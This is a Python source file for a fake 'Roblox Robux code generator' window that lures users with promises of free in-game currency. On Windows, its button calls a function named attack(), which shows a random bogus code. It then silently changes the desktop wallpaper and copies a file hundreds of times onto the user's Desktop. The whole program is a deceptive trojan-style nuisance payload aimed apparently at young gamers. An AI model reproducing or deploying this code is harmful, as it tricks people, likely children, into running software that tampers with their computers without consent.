import os
from os import path, walk
import ctypes
from tkinter import Tk
from tkinter.ttk import *
from PIL import Image, ImageTk
import shutil
import platform
import yaml
import random
import config as c

# ! WORKS ONLY IN THE WINDOWS

systemName = platform.system().lower()

window = Tk()
window.title("ROBLOX OFFICIAL ROBUX CODE GENERATOR 🤑🤑🤑🤑")
window.geometry("400x400")

robuxtext = Label(window, text="Click on the button below to win a 1 Billion robux Code 🤑")
robuxtext.pack(padx=15,pady=25)

getrobuxnow = Button(window, text="GENERATE NEW CODE NOW!!!")
getrobuxnow.pack(pady=15)

code = Label(window, text="Output: Nothing 😭")
code.pack(padx=15,pady=10)

bobuximg = ImageTk.PhotoImage(Image.open("res/img/bobux.png"))
robux = Label(image=bobuximg)
robux.pack()

def generateFakeCode():
    fakecode:str = ""
    chars = yaml.safe_load(open("res/chars.yaml"))["chars"]

    for i in range(random.randint(10, 20)):
        fakecode += random.choice(chars)  

    code.config(text="Output: "+fakecode)

abs = path.abspath(c.complete)

def attack():
    generateFakeCode()

    ctypes.windll.user32.SystemParametersInfoW(20, 0, abs, 0)
    for i in range(random.randint(200, 400)):
        shutil.copy(abs, path.join(path.join(os.environ['USERPROFILE']), 'Desktop', c.fileIN(i)))

if systemName != "windows":
    getrobuxnow.config(command=generateFakeCode)
    print('Operating System not supported!')
else:
    getrobuxnow.config(command=attack)

window.mainloop()